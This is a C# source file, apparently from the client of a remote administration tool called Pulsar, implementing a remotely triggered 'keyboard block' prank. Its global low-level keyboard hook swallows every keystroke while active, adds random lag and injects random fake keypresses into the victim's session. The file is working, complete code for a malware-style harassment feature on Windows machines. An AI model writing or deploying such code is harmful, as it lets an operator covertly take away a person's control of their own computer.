using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Pulsar.Common.Messages.FunStuff;

namespace Pulsar.Client.FunStuff
{
    internal class KeyboardInput : IDisposable
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;

        private IntPtr _hookID = IntPtr.Zero;
        private bool _isBlocked;
        private readonly LowLevelKeyboardProc _hookProc;
        private Random _rng = new Random();
        private Thread _hookThread;
        private ManualResetEvent _hookReadyEvent = new ManualResetEvent(false);

        public KeyboardInput()
        {
            _hookProc = HookCallback;
        }

        public bool IsKeyboardDisabled => _isBlocked;

        public void EnableKeyboardBlock()
        {
            if (_isBlocked) return;

            // Start the hook in a separate thread
            _hookThread = new Thread(InstallHook)
            {
                Name = "KeyboardHookThread",
                IsBackground = true
            };
            _hookThread.Start();

            // Wait for hook to be installed
            _hookReadyEvent.WaitOne(1000);
            _isBlocked = true;
        }

        public void DisableKeyboardBlock()
        {
            if (!_isBlocked) return;

            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }

            _hookThread?.Join(1000); // Wait for thread to finish
            _hookThread = null;
            _hookReadyEvent.Reset();
            _isBlocked = false;
        }

        public void ToggleKeyboardBlock()
        {
            if (_isBlocked) DisableKeyboardBlock();
            else EnableKeyboardBlock();
        }

        public void Handle(DoBlockKeyboardInput message)
        {
            if (message.Block) EnableKeyboardBlock();
            else DisableKeyboardBlock();
        }

        private void InstallHook()
        {
            try
            {
                using (Process process = Process.GetCurrentProcess())
                using (ProcessModule module = process.MainModule)
                {
                    _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc,
                        GetModuleHandle(module.ModuleName), 0);
                }

                if (_hookID == IntPtr.Zero)
                {
                    throw new Exception("Failed to install keyboard hook");
                }

                _hookReadyEvent.Set(); // Signal that hook is ready

                // Start message pump to keep the hook alive
                Application.Run();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Hook thread error: {ex.Message}");
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && _isBlocked)
            {
                // Grab the key data
                int vkCode = Marshal.ReadInt32(lParam);

                // 1. Random key swap
                if (_rng.NextDouble() < 0.5)
                    vkCode = _rng.Next(0x20, 0x7E); // random printable char

                // 2. Simulate lag
                Thread.Sleep(_rng.Next(100, 500)); // 100–500ms random lag

                // 3. Optionally inject fake key
                if (_rng.NextDouble() < 0.3)
                {
                    SendKey((Keys)_rng.Next(0x41, 0x5A)); // inject random letter
                }

                // 4. Swallow the original input
                return (IntPtr)1;
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private void SendKey(Keys key)
        {
            INPUT[] inputs = new INPUT[]
            {
                new INPUT
                {
                    type = 1,
                    U = new InputUnion
                    {
                        ki = new KEYBDINPUT
                        {
                            wVk = (ushort)key,
                            dwFlags = 0
                        }
                    }
                },
                new INPUT
                {
                    type = 1,
                    U = new InputUnion
                    {
                        ki = new KEYBDINPUT
                        {
                            wVk = (ushort)key,
                            dwFlags = 2 // KEYEVENTF_KEYUP
                        }
                    }
                }
            };
            SendInput((uint)inputs.Length, inputs, INPUT.Size);
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct INPUT
        {
            public uint type;
            public InputUnion U;
            public static int Size => Marshal.SizeOf(typeof(INPUT));
        }

        [StructLayout(LayoutKind.Explicit)]
        private struct InputUnion
        {
            [FieldOffset(0)] public KEYBDINPUT ki;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KEYBDINPUT
        {
            public ushort wVk;
            public ushort wScan;
            public uint dwFlags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        [DllImport("user32.dll")]
        private static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
            IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        public void Dispose()
        {
            DisableKeyboardBlock();
            _hookReadyEvent?.Dispose();
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    }
}